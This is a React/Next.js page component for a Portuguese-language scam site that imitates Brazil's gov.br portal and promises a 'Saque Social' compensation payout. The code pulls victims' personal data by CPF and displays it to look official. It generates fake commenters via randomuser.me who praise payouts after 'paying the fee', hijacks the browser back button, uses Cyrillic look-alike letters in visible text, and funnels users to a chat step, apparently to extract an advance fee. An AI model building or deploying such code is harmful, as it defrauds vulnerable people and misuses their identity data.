
"use client";

import React, { useState, useEffect, useRef, Suspense, useMemo } from 'react';
import Head from 'next/head';
import Image from 'next/image';
import { useRouter, useSearchParams } from 'next/navigation';
import 'plyr-react/plyr.css';
import type PlyrInstance from 'plyr';
import '../offer-page.css'; 
import {
  MoreVertical, Cookie, LayoutGrid, User, Menu, Search, CreditCard, CalendarDays, ThumbsUp, ThumbsDown, X, Loader2, VolumeX
} from 'lucide-react';
import dynamic from 'next/dynamic';

const Plyr = dynamic(() => import('plyr-react'), {
  ssr: false,
});


interface UserData {
  nome?: string;
  cpf?: string;
  nascimento?: string;
  mae?: string;
}

interface Comment {
  name: string;
  avatar: string;
  text: string;
  likes: number;
  dislikes: number;
  id: string;
}

function OfferContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const initialCpf = searchParams.get('cpf');

  const playerRef = useRef<PlyrInstance | null>(null);
  const videoUrl = "https://225412.b-cdn.net/Video%20Page.mp4";

  const [pageLoading, setPageLoading] = useState(true);
  const [showMainContent, setShowMainContent] = useState(false); 
  
  const [progress, setProgress] = useState(0);
  const [showThumbnailOverlay, setShowThumbnailOverlay] = useState(true);
  const [showResgateOverlay, setShowResgateOverlay] = useState(false);
  const [videoStarted, setVideoStarted] = useState(false);
  const [videoCompleted, setVideoCompleted] = useState(false);
  const [progressEnabled, setProgressEnabled] = useState(false);
  const [showSaqueButton, setShowSaqueButton] = useState(false);


  const [userData, setUserData] = useState<UserData | null>(null);
  const [headerUserName, setHeaderUserName] = useState('Usuáriо');
  const [statusMessage, setStatusMessage] = useState("Sua indenização está sendo calculada...");
  const [fetchError, setFetchError] = useState<string | null>(null);


  const [comments, setComments] = useState<Comment[]>([]);
  const [totalComments, setTotalComments] = useState(25738);
  const [loadingCommentsText, setLoadingCommentsText] = useState('');
  

  useEffect(() => {
    const urlBackRedirect = '/back/index.html'; 
    const query = searchParams.toString();
    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + query;

    history.pushState({}, "", window.location.href);
    history.pushState({}, "", window.location.href);

    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []); // Runs once on mount
  
  useEffect(() => {
    const storedState = localStorage.getItem('offerPageState');
    if (storedState) {
      try {
        const state = JSON.parse(storedState);
        if (state.videoStarted) setVideoStarted(state.videoStarted);
        if (state.videoCompleted) {
            setVideoCompleted(state.videoCompleted);
            finalizeProgressAppearance(); 
        }
        if (state.progressEnabled) setProgressEnabled(state.progressEnabled);
      } catch (e) {
        console.error("Failed to parse stored state:", e);
        localStorage.removeItem('offerPageState');
      }
    }
  }, []);

  useEffect(() => {
    const stateToStore = {
      videoStarted,
      videoCompleted,
      progressEnabled,
    };
    localStorage.setItem('offerPageState', JSON.stringify(stateToStore));
  }, [videoStarted, videoCompleted, progressEnabled]);


  const formatCPF = (cpf: string | undefined) => {
    if (!cpf) return '---';
    const onlyNums = cpf.replace(/\D/g, '');
    if (onlyNums.length !== 11) return cpf; // Return original if not 11 digits after cleaning
    return onlyNums.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  const formatDateBR = (dateStr: string | undefined) => {
    if (!dateStr) return '---';
    const dateOnly = dateStr.split(' ')[0];
    const [year, month, day] = dateOnly.split('-');
    if (!year || !month || !day || year.length !== 4 || month.length !== 2 || day.length !== 2) return '---'; // Basic validation
    return `${day}/${month}/${year}`;
  };

  const formatFullName = (name: string | undefined) => {
    if (!name) return '---';
    return name
      .toLowerCase()
      .split(' ')
      .filter(p => p)
      .map(p => p.charAt(0).toUpperCase() + p.slice(1))
      .join(' ');
  };

  useEffect(() => {
    async function fetchAndSetUserData() {
      if (!initialCpf) {
        setPageLoading(false);
        setShowMainContent(true); 
        setFetchError("CPF não encontrado nos parâmetros da URL.");
        console.warn("CPF not found in query params.");
        return;
      }
      
      setPageLoading(true);
      setFetchError(null);
      try {
        const response = await fetch(`/api/userData?cpf=${initialCpf}`); 
        
        if (!response.ok) {
          const errorData = await response.json().catch(() => ({ error: "Erro desconhecido ao processar resposta da API interna" }));
          console.error("Erro da API interna:", response.status, errorData);
          throw new Error(errorData.error || `Falha ao buscar dados do usuário. Status: ${response.status}`);
        }
        const data = await response.json();
        
        if (data.dadosBasicos) {
          setUserData(data.dadosBasicos);
          setHeaderUserName(formatFullName(data.dadosBasicos.nome).split(' ')[0] || 'Usuáriо');
        } else if (data.error) {
          console.error("Erro retornado pela API interna:", data.error, data.details);
          throw new Error(data.error || "Formato de dados do usuário incorreto ou erro da API.");
        } else {
          throw new Error('Formato de dados do usuário incorreto.');
        }
      } catch (err: any) {
        console.error("Erro ao buscar dados do usuário pela API interna:", err);
        setFetchError(err.message || "Ocorreu um erro ao buscar seus dados.");
      } finally {
        setPageLoading(false);
        setShowMainContent(true);
      }
    }
    
    fetchAndSetUserData();
  }, [initialCpf]);
  
  const handleSaqueButtonClick = () => {
    const newParams = new URLSearchParams(searchParams.toString()); // Preserve existing query params

    // Determine CPF to use: userData.cpf has priority, then initialCpf from the URL
    const cpfToFormat = userData?.cpf || initialCpf;
    newParams.set('cpf', formatCPF(cpfToFormat)); // formatCPF handles undefined by returning '---'

    // Set other user data from userData if available; format functions handle undefined inputs
    newParams.set('nome', formatFullName(userData?.nome));
    newParams.set('mae', formatFullName(userData?.mae));
    newParams.set('nascimento', formatDateBR(userData?.nascimento));
    
    const targetUrl = `/chat?${newParams.toString()}`;
    router.push(targetUrl);
  };
  
  const handleThumbnailClick = async () => {
    if (playerRef.current?.plyr) {
      try {
        playerRef.current.plyr.muted = false; // Unmute first
        await playerRef.current.plyr.play(); // Then play
        setShowThumbnailOverlay(false);
        // If autoplay was true and muted, progress might already be enabled.
        // Ensure it's enabled now that user interacted.
        if (!progressEnabled) setProgressEnabled(true); 
        if (!videoStarted) setVideoStarted(true);
      } catch (error) {
        console.error("Error trying to play/unmute video:", error);
        // Fallback or user notification could be added here
      }
    }
  };

  const finalizeProgressAppearance = () => {
      setShowResgateOverlay(true);
      setStatusMessage("Saque liberado.");
      setShowSaqueButton(true);
      setProgress(100);
  }

  const handleVideoEnd = () => {
    if (!videoCompleted) {
        setVideoCompleted(true);
        finalizeProgressAppearance();
    }
  };

  useEffect(() => {
    const plyr = playerRef.current?.plyr;
    if (plyr) {
      const onTimeUpdate = () => {
        if (!progressEnabled || videoCompleted || !plyr.duration || plyr.duration === 0) return;
        const percent = (plyr.currentTime / plyr.duration) * 100;
        setProgress(percent);
        if (percent >= 99.9 && !videoCompleted) {
          handleVideoEnd();
        }
      };
      const onPlay = () => {
        if (!videoCompleted) { 
          if (!videoStarted) setVideoStarted(true);
          // Enable progress tracking as soon as play starts, even if initially muted by autoplay
          if (!progressEnabled) setProgressEnabled(true); 
        } else if (videoCompleted) {
            plyr.pause(); 
        }
      };
      const onEnded = () => {
        handleVideoEnd();
      };

      plyr.on('timeupdate', onTimeUpdate);
      plyr.on('play', onPlay);
      plyr.on('ended', onEnded);
      
      if (videoCompleted) {
        finalizeProgressAppearance();
        setShowThumbnailOverlay(false); 
      } else if (videoStarted && plyr.autoplay && plyr.muted) { // If autoplay started it muted
        setProgressEnabled(true); // Progress should reflect muted autoplay
        setShowThumbnailOverlay(true); // Keep thumbnail for unmuting
      } else if (videoStarted) { // Video started by user click or unmuted autoplay
        setProgressEnabled(true);
        setShowThumbnailOverlay(false);
      }


      return () => {
        if (plyr && !plyr.destroyed && typeof plyr.off === 'function') {
          try {
            plyr.off('timeupdate', onTimeUpdate);
            plyr.off('play', onPlay);
            plyr.off('ended', onEnded);
          } catch (e) {
            console.warn("Error during Plyr event cleanup:", e);
          }
        }
      };
    }
  }, [videoCompleted, videoStarted, progressEnabled, playerRef.current]); 


  useEffect(() => {
    const fetchRandomUser = async () => {
      try {
        const res = await fetch('https://randomuser.me/api/?nat=br');
        const data = await res.json();
        return data.results[0];
      } catch (error) {
        console.error("Error fetching random user:", error);
        return { name: { first: "Usuário", last: "Anônimo" }, picture: { medium: "https://placehold.co/40x40.png" } };
      }
    };

    const createNewComment = async (text: string) => {
      const user = await fetchRandomUser();
      const newComment: Comment = {
        id: Date.now().toString(),
        name: formatFullName(user.name.first + " " + user.name.last) || "Usuário Anônimo",
        avatar: user.picture.medium,
        text,
        likes: Math.floor(Math.random() * 100),
        dislikes: Math.floor(Math.random() * 20),
      };
      setComments(prev => [newComment, ...prev.slice(0, 4)]); 
      setTotalComments(prev => prev + 1);
    };
    
    const initialTexts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
    // Only populate initial comments if comments array is empty
    if (comments.length === 0) {
        Promise.all(initialTexts.map(text => createNewComment(text)));
    }


    const commentInterval = setInterval(() => {
      const messages = [
        "Alguém conseguiu R$ 2.700 hoje?",
        "Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!",
        "Testei hoje e entrou R$ 2.100 rapidinho!",
        "Show! Liberou R$ 4.250 e já usei tudo!",
        "Recebi R$ 5.000, só precisei pagar a taxa"
      ];
      createNewComment(messages[Math.floor(Math.random() * messages.length)]);
      setLoadingCommentsText("Comentários atualizados.");
      setTimeout(() => setLoadingCommentsText(""), 2000); 
    }, 10000); 

    return () => clearInterval(commentInterval);
  }, []); 


  const plyrSource = useMemo(() => ({
    type: 'video' as const,
    sources: [{ src: videoUrl, provider: 'html5' as const }],
  }), [videoUrl]);

  const plyrOptions = useMemo(() => ({
    controls: [], 
    hideControls: true,
    clickToPlay: false, // Manually handle click via overlay
    autoplay: true, // Autoplay enabled
    muted: true, // Must be muted for autoplay to work in most browsers   
    playsinline: true,
  }), []);


  if (pageLoading) {
    return (
      <div id="loading-screen">
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45">
          <title>GОV.ВR</title>
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
          </text>
        </svg>
      </div>
    );
  }

  return (
    <>
      <Head>
        <title>Рrоgrаmа Sаquе Sосiаl - Oferta</title>
      </Head>
      <div className="offer-page-body">
        <header className="offer-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45">
              <title>GОV.ВR</title>
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User /> <span id="header-user-name">{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="offer-page-nav">
          <button>
            <Menu />
            <p>Веnеfíсiо <span> &gt; </span> Іndеnizаçãо <span> &gt; </span> Аnálisе</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        {showMainContent && (
          <main id="main-content">
            {fetchError && (
                <div className="error-message-box">
                    <p>Erro ao carregar dados: {fetchError}</p>
                    <p>Por favor, tente recarregar a página ou verifique sua conexão.</p>
                </div>
            )}
            <div className="progress-container">
              <div className="progress-bar" style={{ width: `${progress}%` }}></div>
            </div>
            <div className="video-container">
               <Plyr
                  ref={playerRef}
                  source={plyrSource}
                  options={plyrOptions}
                />
                {showThumbnailOverlay && (
                  <div className="thumbnail-overlay" onClick={handleThumbnailClick}>
                    <div className="thumbnail-content">
                      <h2>Сliquе<br />раrа оuvir</h2>
                      <VolumeX size={64} color="white" />
                    </div>
                  </div>
                )}
                {showResgateOverlay && (
                  <div className="resgate-overlay">
                    <div className="resgate-content">
                      <h2>Sеu sаquе já еstá disроnívеl раrа rеsgаtе!</h2>
                      <p>Сliquе nо bоtãо аbаiхо раrа еfеtuаr о sаquе.</p>
                    </div>
                  </div>
                )}
            </div>

            <div className="info-container">
              <div className="info-item">
                <CreditCard /> <span id="cpf-value">{formatCPF(userData?.cpf || initialCpf)}</span>
              </div>
              <div className="info-item">
                <User /> <span id="name-value">{formatFullName(userData?.nome)}</span>
              </div>
              <div className="info-item">
                <CalendarDays /> <span id="birth-value">{formatDateBR(userData?.nascimento)}</span>
              </div>
              <div className="info-item">
                <User /> <span id="mother-value">{formatFullName(userData?.mae) || 'Não Informado'}</span>
              </div>
              <div className="info-item" id="status-item">
                <Search /> <span>{statusMessage}</span>
              </div>
            </div>

            {showSaqueButton && (
              <button className="button-saque" onClick={handleSaqueButtonClick} style={{display: 'block'}}>
                Еfеtuаr Sаquе Аgоrа
              </button>
            )}
          </main>
        )}

        {showMainContent && (
          <>
            <div className="fb-header-outside">Comentários ({totalComments})</div>
            <div className="fb-comments-container">
              <div className="fb-header">
                <span className="fb-comment-count">Comentários: {totalComments}</span>
                <span className="fb-loading">
                  {loadingCommentsText ? <><Loader2 className="animate-spin" size={14} /> {loadingCommentsText}</> : "Comentários atualizados."}
                </span>
              </div>
              {comments.map(comment => (
                <div key={comment.id} className="comment-item">
                  <Image className="comment-avatar" src={comment.avatar} alt="avatar" width={40} height={40} data-ai-hint="person avatar"/>
                  <div className="comment-content">
                    <div className="comment-name">{comment.name}</div>
                    <div className="comment-text" dangerouslySetInnerHTML={{ __html: comment.text }}></div>
                    <div className="comment-actions">
                      <span className="comment-likes"><ThumbsUp size={12} /> {comment.likes}</span>
                      <span className="comment-dislikes"><ThumbsDown size={12} /> {comment.dislikes}</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </>
        )}

        <footer className="offer-page-footer">Теrmоs dе Usо dе Аvisо dе Рrivасidаdе</footer>

      </div>
    </>
  );
}

export default function OfferPage() {
  return (
    <Suspense fallback={
      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
          <title>GОV.ВR</title> 
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
          </text> 
        </svg> 
      </div>
    }>
      <OfferContent />
    </Suspense>
  );
}

